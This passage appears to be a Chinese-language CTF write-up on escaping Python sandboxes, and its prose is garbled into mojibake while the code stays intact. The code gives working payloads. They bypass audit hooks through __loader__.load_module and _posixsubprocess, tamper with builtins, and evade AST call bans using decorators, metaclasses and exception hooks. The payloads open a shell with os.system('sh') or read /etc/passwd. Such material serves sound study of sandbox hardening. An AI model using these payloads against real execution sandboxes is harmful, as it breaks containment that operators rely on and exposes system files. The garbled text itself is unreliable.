è¿™é“é¢˜éœ€è¦ç»•è¿‡çš„ç‚¹æœ‰ä¸¤ä¸ª:
1. ç»•è¿‡ import å¯¼å…¥æ¨¡å—. å¦‚æœç›´æ¥ä½¿ç”¨ import,å°±ä¼šè§¦å‘ audithook
   ```py
   > __import__('ctypes')
    Operation not permitted: import
   ```
2. ç»•è¿‡å¸¸è§„çš„å‘½ä»¤æ‰§è¡Œæ–¹æ³•æ‰§è¡Œå‘½ä»¤. åˆ©ç”¨ os, subproccess ç­‰æ¨¡å—æ‰§è¡Œå‘½ä»¤æ—¶ä¹Ÿä¼šè§¦å‘ audithook


### è°ƒè¯•æŠ€å·§
æœ¬åœ°è°ƒè¯•æ—¶å¯ä»¥åœ¨ hook å‡½æ•°ä¸­æ·»åŠ æ‰“å°å‡º hook çš„ç±»å‹.
```py
def my_audit_hook(my_event, _):
    print(f'[+] {my_event}, {_}')
    WHITED_EVENTS = set({'builtins.input', 'builtins.input/result', 'exec', 'compile'})
    if my_event not in WHITED_EVENTS:
        raise RuntimeError('Operation not permitted: {}'.format(my_event))
```

è¿™æ ·åœ¨æµ‹è¯• payload æ—¶å°±å¯ä»¥çŸ¥é“è§¦å‘äº†å“ªäº› hook
```py
> import os
[+] builtins.input/result, ('import os',)
[+] compile, (b'import os', '<string>')
[+] exec, (<code object <module> at 0x7f966795bec0, file "<string>", line 1>,)
```


### `__loader__.load_module` å¯¼å…¥æ¨¡å—
`__loader__.load_module(fullname)` ä¹Ÿæ˜¯ python ä¸­ç”¨äºå¯¼å…¥æ¨¡å—çš„ä¸€ä¸ªæ–¹æ³•å¹¶ä¸”ä¸éœ€è¦å¯¼å…¥å…¶ä»–ä»»ä½•åº“.

```py
__loader__.load_module('os')
```

`__loader__` å®é™…ä¸ŠæŒ‡å‘çš„æ˜¯ `_frozen_importlib.BuiltinImporter` ç±»,ä¹Ÿå¯ä»¥é€šè¿‡åˆ«çš„æ–¹å¼è¿›è¡Œè·å–
```py
>>> ().__class__.__base__.__subclasses__()[84]
<class '_frozen_importlib.BuiltinImporter'>
>>> __loader__
<class '_frozen_importlib.BuiltinImporter'>
>>> ().__class__.__base__.__subclasses__()[84].__name__
'BuiltinImporter'
>>> [x for x in ().__class__.__base__.__subclasses__() if 'BuiltinImporter' in x.__name__][0]
<class '_frozen_importlib.BuiltinImporter'>
```

`__loader__.load_module` ä¹Ÿæœ‰ä¸€ä¸ªç¼ºç‚¹å°±æ˜¯æ— æ³•å¯¼å…¥éå†…å»ºæ¨¡å—. ä¾‹å¦‚ socket
```py
>>> __loader__.load_module('socket')
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "<frozen importlib._bootstrap>", line 290, in _load_module_shim
  File "<frozen importlib._bootstrap>", line 721, in _load
  File "<frozen importlib._bootstrap>", line 676, in _load_unlocked
  File "<frozen importlib._bootstrap>", line 573, in module_from_spec
  File "<frozen importlib._bootstrap>", line 776, in create_module
ImportError: 'socket' is not a built-in module
```

### _posixsubprocess æ‰§è¡Œå‘½ä»¤

_posixsubprocess æ¨¡å—æ˜¯ Python çš„å†…éƒ¨æ¨¡å—ï¼Œæä¾›äº†ä¸€ä¸ªç”¨äºåœ¨ UNIX å¹³å°ä¸Šåˆ›å»ºå­è¿›ç¨‹çš„ä½çº§åˆ«æ¥å£ã€‚subprocess æ¨¡å—çš„å®ç°å°±ç”¨åˆ°äº† _posixsubprocess.

è¯¥æ¨¡å—çš„æ ¸å¿ƒåŠŸèƒ½æ˜¯ fork_exec å‡½æ•°ï¼Œfork_exec æä¾›äº†ä¸€ä¸ªéå¸¸åº•å±‚çš„æ–¹å¼æ¥åˆ›å»ºä¸€ä¸ªæ–°çš„å­è¿›ç¨‹ï¼Œå¹¶åœ¨è¿™ä¸ªæ–°è¿›ç¨‹ä¸­æ‰§è¡Œä¸€ä¸ªæŒ‡å®šçš„ç¨‹åºã€‚ä½†è¿™ä¸ªæ¨¡å—å¹¶æ²¡æœ‰åœ¨ Python çš„æ ‡å‡†åº“æ–‡æ¡£ä¸­åˆ—å‡º,æ¯ä¸ªç‰ˆæœ¬çš„ Python å¯èƒ½æœ‰æ‰€å·®å¼‚.

åœ¨æˆ‘æœ¬åœ°çš„ Python 3.11 ä¸­å…·ä½“çš„å‡½æ•°å£°æ˜å¦‚ä¸‹:
```py
def fork_exec(
    __process_args: Sequence[StrOrBytesPath] | None,
    __executable_list: Sequence[bytes],
    __close_fds: bool,
    __fds_to_keep: tuple[int, ...],
    __cwd_obj: str,
    __env_list: Sequence[bytes] | None,
    __p2cread: int,
    __p2cwrite: int,
    __c2pred: int,
    __c2pwrite: int,
    __errread: int,
    __errwrite: int,
    __errpipe_read: int,
    __errpipe_write: int,
    __restore_signals: int,
    __call_setsid: int,
    __pgid_to_set: int,
    __gid_object: SupportsIndex | None,
    __groups_list: list[int] | None,
    __uid_object: SupportsIndex | None,
    __child_umask: int,
    __preexec_fn: Callable[[], None],
    __allow_vfork: bool,
) -> int: ...
```

- `__process_args`: ä¼ é€’ç»™æ–°è¿›ç¨‹çš„å‘½ä»¤è¡Œå‚æ•°ï¼Œé€šå¸¸ä¸ºç¨‹åºè·¯å¾„åŠå…¶å‚æ•°çš„åˆ—è¡¨ã€‚
- `__executable_list`: å¯æ‰§è¡Œç¨‹åºè·¯å¾„çš„åˆ—è¡¨ã€‚
- `__close_fds`: å¦‚æœè®¾ç½®ä¸ºTrueï¼Œåˆ™åœ¨æ–°è¿›ç¨‹ä¸­å…³é—­æ‰€æœ‰çš„æ–‡ä»¶æè¿°ç¬¦ã€‚
- `__fds_to_keep`: ä¸€ä¸ªå…ƒç»„ï¼Œè¡¨ç¤ºåœ¨æ–°è¿›ç¨‹ä¸­éœ€è¦ä¿æŒæ‰“å¼€çš„æ–‡ä»¶æè¿°ç¬¦çš„åˆ—è¡¨ã€‚
- `__cwd_obj`: æ–°è¿›ç¨‹çš„å·¥ä½œç›®å½•ã€‚
- `__env_list`: ç¯å¢ƒå˜é‡åˆ—è¡¨ï¼Œå®ƒæ˜¯é”®å’Œå€¼çš„åºåˆ—ï¼Œä¾‹å¦‚ï¼š["PATH=/usr/bin", "HOME=/home/user"]ã€‚
- `__p2cread, __p2cwrite, __c2pred, __c2pwrite, __errread, __errwrite`: è¿™äº›æ˜¯æ–‡ä»¶æè¿°ç¬¦ï¼Œç”¨äºåœ¨çˆ¶å­è¿›ç¨‹é—´è¿›è¡Œé€šä¿¡ã€‚
- `__errpipe_read, __errpipe_write`: è¿™ä¸¤ä¸ªæ–‡ä»¶æè¿°ç¬¦ç”¨äºçˆ¶å­è¿›ç¨‹é—´çš„é”™è¯¯é€šä¿¡ã€‚
- `__restore_signals`: å¦‚æœè®¾ç½®ä¸º1ï¼Œåˆ™åœ¨æ–°åˆ›å»ºçš„å­è¿›ç¨‹ä¸­æ¢å¤é»˜è®¤çš„ä¿¡å·å¤„ç†ã€‚
- `__call_setsid`: å¦‚æœè®¾ç½®ä¸º1ï¼Œåˆ™åœ¨æ–°è¿›ç¨‹ä¸­åˆ›å»ºæ–°çš„ä¼šè¯ã€‚
- `__pgid_to_set`: è®¾ç½®æ–°è¿›ç¨‹çš„è¿›ç¨‹ç»„ IDã€‚
- `__gid_object, __groups_list, __uid_object`: è¿™äº›å‚æ•°ç”¨äºè®¾ç½®æ–°è¿›ç¨‹çš„ç”¨æˆ·ID å’Œç»„ IDã€‚
- `__child_umask`: è®¾ç½®æ–°è¿›ç¨‹çš„ umaskã€‚
- `__preexec_fn`: åœ¨æ–°è¿›ç¨‹ä¸­æ‰§è¡Œçš„å‡½æ•°ï¼Œå®ƒä¼šåœ¨æ–°è¿›ç¨‹çš„ä¸»ä½“éƒ¨åˆ†æ‰§è¡Œä¹‹å‰è°ƒç”¨ã€‚
- `__allow_vfork`: å¦‚æœè®¾ç½®ä¸ºTrueï¼Œåˆ™åœ¨å¯èƒ½çš„æƒ…å†µä¸‹ä½¿ç”¨ vfork è€Œä¸æ˜¯ forkã€‚vfork æ˜¯ä¸€ä¸ªæ›´é«˜æ•ˆçš„ forkï¼Œä½†æ˜¯ä½¿ç”¨ vfork å¯èƒ½ä¼šæœ‰ä¸€äº›é—®é¢˜ ã€‚

ä¸‹é¢æ˜¯ä¸€ä¸ªæœ€å°åŒ–ç¤ºä¾‹:
```py
import os
import _posixsubprocess

_posixsubprocess.fork_exec([b"/bin/cat","/etc/passwd"], [b"/bin/cat"], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False,False, None, None, None, -1, None, False)
```

ç»“åˆä¸Šé¢çš„ `__loader__.load_module(fullname)` å¯ä»¥å¾—åˆ°æœ€ç»ˆçš„ payload:
```py
__loader__.load_module('_posixsubprocess').fork_exec([b"/bin/cat","/etc/passwd"], [b"/bin/cat"], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__loader__.load_module('os').pipe()), False, False,False, None, None, None, -1, None, False)
```

å¯ä»¥çœ‹åˆ°å…¨ç¨‹è§¦å‘äº† `builtins.input/result`, compile, exec ä¸‰ä¸ª hook, è¿™äº› hook çš„è§¦å‘éƒ½æ˜¯å› ä¸º input, compile, exec å‡½æ•°è€Œè§¦å‘çš„, `__loader__.load_module` å’Œ `_posixsubprocess` éƒ½æ²¡æœ‰è§¦å‘.
```py
[+] builtins.input/result, ('__loader__.load_module(\'_posixsubprocess\').fork_exec([b"/bin/cat","/flag"], [b"/bin/cat"], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__loader__.load_module(\'os\').pipe()), False, False,False, None, None, None, -1, None, False)',)
[+] compile, (b'__loader__.load_module(\'_posixsubprocess\').fork_exec([b"/bin/cat","/flag"], [b"/bin/cat"], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__loader__.load_module(\'os\').pipe()), False, False,False, None, None, None, -1, None, False)', '<string>')
[+] exec, (<code object <module> at 0x7fbecc924670, file "<string>", line 1>,)
```


### å¦ä¸€ç§è§£æ³•: ç¯¡æ”¹å†…ç½®å‡½æ•°
è¿™é“ audit hook é¢˜è¿˜æœ‰å¦å¤–ä¸€ç§è§£æ³•.å¯ä»¥çœ‹åˆ°ç™½åå•æ˜¯é€šè¿‡ set å‡½æ•°è¿”å›çš„, set ä½œä¸ºä¸€ä¸ªå†…ç½®å‡½æ•°å®é™…ä¸Šä¹Ÿæ˜¯å¯ä»¥ä¿®æ”¹çš„
```py
WHITED_EVENTS = set({'builtins.input', 'builtins.input/result', 'exec', 'compile'})
```

æ¯”å¦‚æˆ‘ä»¬å°† set å‡½æ•°ä¿®æ”¹ä¸ºå›ºå®šè¿”å›ä¸€ä¸ªåŒ…å«äº† os.system å‡½æ•°çš„åˆ—è¡¨
```py
__builtins__.set = lambda x: ['builtins.input', 'builtins.input/result','exec', 'compile', 'os.system']
```
è¿™æ · set å‡½æ•°ä¼šå›ºå®šè¿”å›å¸¦æœ‰ os.system çš„åˆ—è¡¨.

```py
__builtins__.set = lambda x: ['builtins.input', 'builtins.input/result','exec', 'compile', 'os.system']
```

æœ€ç»ˆ payload:
```py
# 
exec("for k,v in enumerate(globals()['__builtins__']): print(k,v)")

# ç¯¡æ”¹å‡½æ•°
exec("globals()['__builtins__']['set']=lambda x: ['builtins.input', 'builtins.input/result','exec', 'compile', 'os.system']\nimport os\nos.system('cat flag2.txt')")
```


### å…¶ä»–ä¸è§¦å‘ hook çš„æ–¹å¼
ä½¿ç”¨ `__loader__.load_module('os')` æ˜¯ä¸ºäº†è·å– os æ¨¡å—, å…¶å®åœ¨ no builtins åˆ©ç”¨æ‰‹æ³•ä¸­, æ— éœ€å¯¼å…¥ä¹Ÿå¯ä»¥è·å–å¯¹åº”æ¨¡å—. ä¾‹å¦‚:

```py
# è·å– sys
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ][0]["sys"]

# è·å– os
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'_sitebuiltins." in str(x) and not "_Helper" in str(x) ][0]["sys"].modules["os"]

# å…¶ä»–çš„ payload ä¹Ÿéƒ½ä¸ä¼šè§¦å‘
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if x.__name__=="_wrap_close"][0]["system"]("ls")
```

## ç»•è¿‡ AST æ²™ç®±
AST æ²™ç®±ä¼šå°†ç”¨æˆ·çš„è¾“å…¥è½¬åŒ–ä¸ºæ“ä½œç ,æ­¤æ—¶å­—ç¬¦ä¸²å±‚é¢çš„å˜æ¢åŸºæœ¬ä¸Šæ²¡ç”¨äº†,ä¸€èˆ¬æƒ…å†µä¸‹è€ƒè™‘ç»•è¿‡ AST é»‘åå•. ä¾‹å¦‚ä¸‹é¢çš„æ²™ç®±ç¦æ­¢äº† ast.Import|ast.ImportFrom|ast.Call è¿™ä¸‰ç±»æ“ä½œ, è¿™æ ·ä¸€æ¥å°±æ— æ³•å¯¼å…¥æ¨¡å—å’Œæ‰§è¡Œå‡½æ•°.

```py
import ast
import sys
import os

def verify_secure(m):
  for x in ast.walk(m):
    match type(x):
      case (ast.Import|ast.ImportFrom|ast.Call):
        print(f"ERROR: Banned statement {x}")
        return False
  return True

abspath = os.path.abspath(__file__)
dname = os.path.dirname(abspath)
os.chdir(dname)

print("-- Please enter code (last line must contain only --END)")
source_code = ""
while True:
  line = sys.stdin.readline()
  if line.startswith("--END"):
    break
  source_code += line

tree = compile(source_code, "input.py", 'exec', flags=ast.PyCF_ONLY_AST)
if verify_secure(tree):  # Safe to execute!
  print("-- Executing safe code:")
  compiled = compile(source_code, "input.py", 'exec')
  exec(compiled)
```
ä¸‹é¢çš„å‡ ç§åˆ©ç”¨æ–¹å¼æ¥æºäº hacktricks
### without call
å¦‚æœåŸºäº AST çš„æ²™ç®±é™åˆ¶äº†æ‰§è¡Œå‡½æ•°,é‚£ä¹ˆå°±éœ€è¦æ‰¾åˆ°ä¸€ç§ä¸éœ€è¦æ‰§è¡Œå‡½æ•°çš„æ–¹å¼æ‰§è¡Œç³»ç»Ÿå‘½ä»¤.
#### è£…é¥°å™¨
åˆ©ç”¨ payload å¦‚ä¸‹:
```py
@exec
@input
class X:
    pass
```
å½“æˆ‘ä»¬è¾“å…¥ä¸Šè¿°çš„ä»£ç å, Python ä¼šæ‰“å¼€è¾“å…¥,æ­¤æ—¶æˆ‘ä»¬å†è¾“å…¥ payload å°±å¯ä»¥æˆåŠŸæ‰§è¡Œå‘½ä»¤.
```python
>>> @exec
... @input
... class X:
...     pass
... 
<class '__main__.X'>__import__("os").system("ls")
```
ç”±äºè£…é¥°å™¨ä¸ä¼šè¢«è§£æä¸ºè°ƒç”¨è¡¨è¾¾å¼æˆ–è¯­å¥, å› æ­¤å¯ä»¥ç»•è¿‡é»‘åå•, æœ€ç»ˆä¼ å…¥çš„ payload æ˜¯ç”± input æ¥æ”¶çš„, å› æ­¤ä¹Ÿä¸ä¼šè¢«æ‹¦æˆª.

å…¶å®è¿™æ ·çš„è¯,æ„é€ å…¶å®å¯ä»¥æœ‰å¾ˆå¤š,æ¯”å¦‚ç›´æ¥æ‰“å¼€ help å‡½æ•°.
```py
@help
class X:
    pass
```
è¿™æ ·å¯ä»¥ç›´æ¥è¿›å…¥å¸®åŠ©æ–‡æ¡£:
```py
Help on class X in module __main__:

class X(builtins.object)
 |  Data descriptors defined here:
 |  
 |  __dict__
 |      dictionary for instance variables (if defined)
 |  
 |  __weakref__
 |      list of weak references to the object (if defined)
(END)
```
å†æ¬¡è¾“å…¥ !sh å³å¯æ‰“å¼€ /bin/sh


#### å‡½æ•°è¦†ç›–

æˆ‘ä»¬çŸ¥é“åœ¨ Python ä¸­è·å–ä¸€ä¸ªçš„å±æ€§ä¾‹å¦‚ `obj[argument]` å®é™…ä¸Šæ˜¯è°ƒç”¨çš„ `obj.__getitem__` æ–¹æ³•.å› æ­¤æˆ‘ä»¬åªéœ€è¦è¦†ç›–å…¶ `__getitem__` æ–¹æ³•, å³å¯åœ¨ä½¿ç”¨ `obj[argument]` æ‰§è¡Œä»£ç :
```py
>>> class A:
...     __getitem__ = exec
... 
>>> A()['__import__("os").system("ls")']
```

ä½†æ˜¯è¿™é‡Œè°ƒç”¨äº† A çš„æ„é€ å‡½æ•°, å› æ­¤ AST ä¸­è¿˜æ˜¯ä¼šå‡ºç° ast.Call. å¦‚ä½•åœ¨ä¸æ‰§è¡Œæ„é€ å‡½æ•°çš„æƒ…å†µä¸‹è·å–ç±»å®ä¾‹å‘¢? 

##### metaclass åˆ©ç”¨
Python ä¸­æä¾›äº†ä¸€ç§å…ƒç±»(metaclass)æ¦‚å¿µã€‚å…ƒç±»æ˜¯åˆ›å»ºç±»çš„â€œç±»â€ã€‚åœ¨ Pythonä¸­ï¼Œç±»æœ¬èº«ä¹Ÿæ˜¯å¯¹è±¡ï¼Œå…ƒç±»å°±æ˜¯åˆ›å»ºè¿™äº›ç±»ï¼ˆå³ç±»çš„å¯¹è±¡ï¼‰çš„ç±»ã€‚

å…ƒç±»åœ¨ Python ä¸­çš„ä½œç”¨ä¸»è¦æ˜¯ç”¨æ¥åˆ›å»ºç±»ã€‚ç±»æ˜¯å¯¹è±¡çš„æ¨¡æ¿ï¼Œè€Œå…ƒç±»åˆ™æ˜¯ç±»çš„æ¨¡æ¿ã€‚å…ƒç±»å®šä¹‰äº†ç±»çš„è¡Œä¸ºå’Œå±æ€§ï¼Œå°±åƒç±»å®šä¹‰äº†å¯¹è±¡çš„è¡Œä¸ºå’Œå±æ€§ä¸€æ ·ã€‚

ä¸‹é¢æ˜¯åŸºäºå…ƒç±»çš„ payload, åœ¨ä¸ä½¿ç”¨æ„é€ å‡½æ•°çš„æƒ…å†µä¸‹è§¦å‘
```py
class Metaclass(type):
    __getitem__ = exec 
    
class Sub(metaclass=Metaclass):
    pass

Sub['import os; os.system("sh")']
```

é™¤äº† `__getitem__` ä¹‹å¤–å…¶ä»–æ–¹æ³•çš„åˆ©ç”¨æ–¹å¼å¦‚ä¸‹:

```py
__sub__ (k - 'import os; os.system("sh")')
__mul__ (k * 'import os; os.system("sh")')
__floordiv__ (k // 'import os; os.system("sh")')
__truediv__ (k / 'import os; os.system("sh")')
__mod__ (k % 'import os; os.system("sh")')
__pow__ (k**'import os; os.system("sh")')
__lt__ (k < 'import os; os.system("sh")')
__le__ (k <= 'import os; os.system("sh")')
__eq__ (k == 'import os; os.system("sh")')
__ne__ (k != 'import os; os.system("sh")')
__ge__ (k >= 'import os; os.system("sh")')
__gt__ (k > 'import os; os.system("sh")')
__iadd__ (k += 'import os; os.system("sh")')
__isub__ (k -= 'import os; os.system("sh")')
__imul__ (k *= 'import os; os.system("sh")')
__ifloordiv__ (k //= 'import os; os.system("sh")')
__idiv__ (k /= 'import os; os.system("sh")')
__itruediv__ (k /= 'import os; os.system("sh")') (Note that this only works when from __future__ import division is in effect.)
__imod__ (k %= 'import os; os.system("sh")')
__ipow__ (k **= 'import os; os.system("sh")')
__ilshift__ (k<<= 'import os; os.system("sh")')
__irshift__ (k >>= 'import os; os.system("sh")')
__iand__ (k = 'import os; os.system("sh")')
__ior__ (k |= 'import os; os.system("sh")')
__ixor__ (k ^= 'import os; os.system("sh")')
```
ç¤ºä¾‹:
```py
class Metaclass(type):
    __sub__ = exec
    
class Sub(metaclass=Metaclass):
    pass

Sub-'import os; os.system("sh")'
```
##### exceptions åˆ©ç”¨
åˆ©ç”¨ exceptions çš„ç›®çš„ä¹Ÿæ˜¯ä¸ºäº†ç»•è¿‡æ˜¾ç¤ºåœ°å®ä¾‹åŒ–ä¸€ä¸ªç±», å¦‚æœä¸€ä¸ªç±»ç»§æ‰¿äº† Exception ç±», é‚£ä¹ˆå°±å¯ä»¥é€šè¿‡ raise å…³é”®å­—æ¥å®ä¾‹åŒ–. payload å¦‚ä¸‹:
```py
class RCE(Exception):
    def __init__(self):
        self += 'import os; os.system("sh")'
    __iadd__ = exec 
    
raise RCE 
```
raise ä¼šè¿›å…¥ RCE çš„ `__init__`, ç„¶åè§¦å‘ `__iadd__` ä¹Ÿå°±æ˜¯ exec.

å½“ç„¶, è§¦å‘å¼‚å¸¸ä¸ä¸€å®šéœ€è¦ raise, ä¸»åŠ¨åœ°ç¼–å†™é”™è¯¯ä»£ç ä¹Ÿå¯ä»¥è§¦å‘,ä¸æ˜¯å°±æœ‰äº†å¦‚ä¸‹çš„å‡ ç§ payload.
```py
class X:
    def __init__(self, a, b, c):
        self += "os.system('sh')"
    __iadd__ = exec
sys.excepthook = X
1/0
```
è¿™ä¸ª payload ä¸­ç›´æ¥å°† sys.excepthook è¿›è¡Œè¦†ç›–,ä»»ä½•å¼‚å¸¸äº§ç”Ÿæ—¶éƒ½ä¼šè§¦å‘.

```py
class X():
  def __init__(self, a, b, c, d, e):
    self += "print(open('flag').read())"
  __iadd__ = eval
__builtins__.__import__ = X
{}[1337]
```
è¿™ä¸ª payload å°† `__import__` å‡½æ•°è¿›è¡Œè¦†ç›–, æœ€åçš„ {}[1337] åœ¨æ­£å¸¸æƒ…å†µä¸‹ä¼šå¼•å‘ KeyError å¼‚å¸¸ï¼Œå› ä¸º Python åœ¨å¼•å‘å¼‚å¸¸æ—¶ä¼šå°è¯•å¯¼å…¥æŸäº›æ¨¡å—ï¼ˆæ¯”å¦‚traceback æ¨¡å—ï¼‰ï¼Œå¯¼å…¥æ—¶å°±ä¼šè§¦å‘ `__import__`.


#### é€šè¿‡ license å‡½æ•°è¯»å–æ–‡ä»¶

```py
__builtins__.__dict__["license"]._Printer__filenames=["/etc/passwd"]
a = __builtins__.help
a.__class__.__enter__ = __builtins__.__dict__["license"]
a.__class__.__exit__ = lambda self, *args: None
with (a as b):
    pass
```
ä¸Šé¢çš„ payload ä¿®æ”¹å†…å»ºå‡½æ•° license çš„æ–‡ä»¶ååˆ—è¡¨ä¸º /etc/passwd å½“è°ƒç”¨ `license()` æ—¶ä¼šæ‰“å°è¿™ä¸ªæ–‡ä»¶çš„å†…å®¹.
```py
>>> __builtins__.__dict__["license"]._Printer__filenames
['/usr/lib/python3.11/../LICENSE.txt', '/usr/lib/python3.11/../LICENSE', '/usr/lib/python3.11/LICENSE.txt', '/usr/lib/python3.11/LICENSE', './LICENSE.txt', './LICENSE']
```
payload ä¸­å°† help ç±»çš„ `__enter__` æ–¹æ³•è¦†ç›–ä¸º `license` æ–¹æ³•, è€Œ with è¯­å¥åœ¨åˆ›å»ºä¸Šä¸‹æ–‡æ—¶ä¼šè°ƒç”¨ help çš„`__enter__`, ä»è€Œæ‰§è¡Œ `license` æ–¹æ³•. è¿™é‡Œçš„ help ç±»åªæ˜¯ä¸€ä¸ªè½½ä½“, æ›¿æ¢ä¸ºå…¶ä»–çš„æ”¯æŒä¸Šä¸‹æ–‡çš„ç±»æˆ–è€…è‡ªå®šä¹‰ä¸€ä¸ªç±»ä¹Ÿæ˜¯å¯ä»¥çš„. ä¾‹å¦‚:
```py
class MyContext:
    pass
    
__builtins__.__dict__["license"]._Printer__filenames=["/etc/passwd"]
a = MyContext()
a.__class__.__enter__ = __builtins__.__dict__["license"]
a.__class__.__exit__ = lambda self, *args: None
with (a as b):
    pass
```

## å…¶ä»–æŠ€å·§

### æ¨¡æ‹Ÿ no builitins ç¯å¢ƒ
no builtins ç¯å¢ƒå’Œ python äº¤äº’å¼è§£æå™¨è¿˜æ˜¯æœ‰æ‰€å·®å¼‚, ä½†äº¤äº’å¼è§£æå™¨å¹¶æ²¡æœ‰æä¾›æŒ‡å®šå‘½åç©ºé—´çš„åŠŸèƒ½,å› æ­¤å¯ä»¥è‡ªå·±ç¼–å†™ä¸€ä¸ªè„šæœ¬è¿›è¡Œæ¨¡æ‹Ÿ:
```py
def repl():
    global_namespace = {}
    local_namespace = {}

    while True:
        try:
            code = input('>>> ')
            try:
                # Try to eval the code first.
                result = eval(code, global_namespace, local_namespace)
            except SyntaxError:
                # If a SyntaxError occurs, this might be because the user entered a statement,
                # in which case we should use exec.
                exec(code, global_namespace, local_namespace)
            else:
                print(result)
        except EOFError:
            break
        except Exception as e:
            print(f"Error: {e}")

if __name__ == "__main__":
    repl()
```


## å‚è€ƒèµ„æ–™
- [Pythonæ²™ç®±é€ƒé€¸å°ç»“](https://www.mi1k7ea.com/2019/05/31/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%B0%8F%E7%BB%93/#%E8%BF%87%E6%BB%A4-globals)
- [Python æ²™ç®±é€ƒé€¸çš„ç»éªŒæ€»ç»“](https://www.tr0y.wang/2019/05/06/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/#%E5%89%8D%E8%A8%80)
- [Python æ²™ç®±é€ƒé€¸çš„é€šè§£æ¢ç´¢ä¹‹è·¯](https://www.tr0y.wang/2022/09/28/common-exp-of-python-jail/)
- [pythonæ²™ç®±é€ƒé€¸å­¦ä¹ è®°å½•](https://xz.aliyun.com/t/12303#toc-11)
- [Bypass Python sandboxes](https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes)
- [[PyJail] pythonæ²™ç®±é€ƒé€¸æ¢ç©¶Â·ä¸Šï¼ˆHNCTFé¢˜è§£ - WEEK1ï¼‰](https://zhuanlan.zhihu.com/p/578986988)
- [[PyJail] pythonæ²™ç®±é€ƒé€¸æ¢ç©¶Â·ä¸­ï¼ˆHNCTFé¢˜è§£ - WEEK2ï¼‰](https://zhuanlan.zhihu.com/p/579057932)
- [[PyJail] pythonæ²™ç®±é€ƒé€¸æ¢ç©¶Â·ä¸‹ï¼ˆHNCTFé¢˜è§£ - WEEK3ï¼‰](https://zhuanlan.zhihu.com/p/579183067)
- [audited2](https://ctftime.org/writeup/31883)
- [ã€ctfã€‘HNCTF Jail All In One](https://www.woodwhale.top/archives/hnctfj-ail-all-in-one)
- [HAXLAB â€” Endgame Pwn](https://ctftime.org/writeup/28286)
- [Pythonæ²™ç®±é€ƒé€¸çš„nç§å§¿åŠ¿](https://ctftime.org/writeup/28286)
- [hxp2020-audited](https://pullp.github.io/writeup/2020/12/26/hxp2020-audited.html)